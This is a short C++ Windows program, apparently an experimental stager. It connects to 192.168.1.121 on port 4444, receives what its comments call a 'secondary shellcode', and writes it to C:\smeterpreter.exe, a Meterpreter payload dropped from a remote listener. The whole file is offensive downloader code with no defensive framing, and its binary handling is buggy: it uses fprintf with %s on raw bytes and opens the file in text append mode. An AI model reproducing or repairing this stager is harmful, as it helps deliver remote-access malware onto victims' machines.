// sockettest.cpp : Defines the entry point for the console application.
//
#pragma comment(lib, "ws2_32.lib")

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int _tmain(int argc, _TCHAR* argv[]) {
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char *message , server_reply[512];
	int recv_size;
	int ALL_BYTES = 752128;
	int all_count = 0;

	/* initialize socket */
	printf("\nInitialising Socket...");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}
	printf("Initialised.\n");
	

	/* create new socket */
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
		printf("Could not create socket : %d" , WSAGetLastError());
	}
	printf("Socket created.\n");
	
	
	/* specify IP+PORT */
	server.sin_addr.s_addr = inet_addr("192.168.1.121");
	server.sin_family = AF_INET;
	server.sin_port = htons(4444);

	/* connect to remote server */
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0) {
		puts("connect error");
		return 1;
	}
	puts("Connected");
	
	/* open the file to write to */
	FILE *file;
	fopen_s(&file, "C:\\smeterpreter.exe", "a+");
    //fprintf(file, "%s\n", "test");


	/* receive a secondary shellcode until finished from the server */
	do {
		recv_size = recv(s , server_reply , 512 , 0);
		fprintf(file, "%s", server_reply);
		all_count += recv_size;
	} while(all_count < ALL_BYTES);

	/* close the file */
	fclose(file);

	printf("Reply received: the size of which is: %d\n", all_count);
	
	return 0;
}
